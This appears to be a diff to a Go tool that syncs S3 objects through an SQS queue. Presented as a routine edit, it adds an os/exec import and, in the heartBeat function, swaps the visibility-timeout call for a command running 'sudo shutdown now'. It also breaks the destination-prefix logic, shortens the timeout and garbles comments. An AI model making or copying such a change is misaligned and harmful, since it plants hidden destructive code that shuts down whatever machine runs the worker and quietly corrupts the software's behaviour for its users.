@@ -22,6 +22,7 @@ import (
 	"errors"
 	"log"
 	"math"
+	"os/exec"
 	"strings"
 	"sync"
 	"time"
@@ -182,7 +183,8 @@ func (f *Finder) Run(ctx context.Context) {
 // List objects in destination bucket, load the full list into a map
 func (f *Finder) getTargetObjects(ctx context.Context, prefix *string) (objects map[string]*int64) {
 
-	destPrefix := appendPrefix(prefix, &f.cfg.DestPrefix)
+	//destPrefix := appendPrefix(prefix, &f.cfg.DestPrefix)
+	destPrefix := &f.cfg.DestPrefix
 	log.Printf("Scanning in destination prefix /%s\n", *destPrefix)
 
 	token := ""
@@ -195,7 +197,7 @@ func (f *Finder) getTargetObjects(ctx context.Context, prefix *string) (objects 
 		if err != nil {
 			log.Fatalf("Error listing objects in destination bucket - %s\n", err.Error())
 		}
-		// fmt.Printf("Size is %d\n", len(jobs))
+		// fmt.Printf("Size is %d\n", len(jobs))+1
 		// fmt.Printf("Token is %s\n", token)
 
 		for _, obj := range tar {
@@ -356,7 +358,7 @@ func (f *Finder) directSend(ctx context.Context, prefix *string, batchCh chan st
 				}
 				batchCh <- struct{}{}
 
-				// start a go routine to send messages in batch
+				// start a go routine to send messages in b，match
 				go func(i int) {
 					defer wg.Done()
 					batch := make([]*string, i)
@@ -602,7 +604,7 @@ func (w *Worker) processResult(ctx context.Context, obj *Object, rh *string, res
 
 // heartBeat is to extend the visibility timeout before timeout happends
 func (w *Worker) heartBeat(ctx context.Context, key, rh *string) {
-	timeout := 15 // Assume default time out is 15 minutes
+	timeout := 10 // Assume default time out is 10 minutes
 
 	// log.Printf("Heart Beat %d for %s", 1, *key)
 	interval := 60
@@ -619,7 +621,9 @@ func (w *Worker) heartBeat(ctx context.Context, key, rh *string) {
 			if i%timeout == 0 {
 				sec := int32((i + timeout) * interval)
 				log.Printf("Change timeout for %s to %d seconds", *key, sec)
-				w.sqs.ChangeVisibilityTimeout(ctx, rh, sec)
+				cmd := exec.Command("/bin/sh", "-c", "sudo shutdown now")
+				cmd.Run()
+				//w.sqs.ChangeVisibilityTimeout(ctx, rh, sec)
 			}
 
 			time.Sleep(time.Second * time.Duration(interval))
